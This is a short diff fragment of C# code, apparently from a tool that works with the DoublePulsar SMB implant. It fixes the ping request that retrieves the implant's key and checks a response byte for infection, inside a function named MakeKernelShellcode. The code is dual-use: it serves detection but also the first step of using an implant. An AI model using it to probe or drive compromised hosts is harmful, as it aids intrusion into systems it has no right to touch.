@@ -634,14 +634,14 @@ static public byte[] MakeKernelShellcode()
             sock.ReceiveTimeout = 2000;
             Console.WriteLine("Connection established");
             
-            //we need to obtain the key for DoublePulsar
-            //Send DoublePulsar trans2 ping packet here
-            char[] pingrequestresponse = DoublepulsarPingRequest(sock, header.UID, header.TID);
+            //we need to obtain the key for DoublePulsar so send DoublePulsar trans2 ping packet here
+            byte[] pingrequestresponse = DoublepulsarPingRequest(sock, header.UID, header.TID);
+		
 	    //Receive Trans2 DoublePulsar Response & Parse
             header = SMB_HeaderFromBytes(pingrequestresponse);
             
             //https://github.com/HynekPetrak/doublepulsar-detection-csharp/blob/master/DoublepulsarDetectionLib/DetectDoublePulsar.cs
-            byte[] final_response = buf;
+            byte[] final_response = pingrequestresponse;
 
              // Check for 0x51 response to indicate DOUBLEPULSAR infection
              if (final_response[34] == 0x51) {
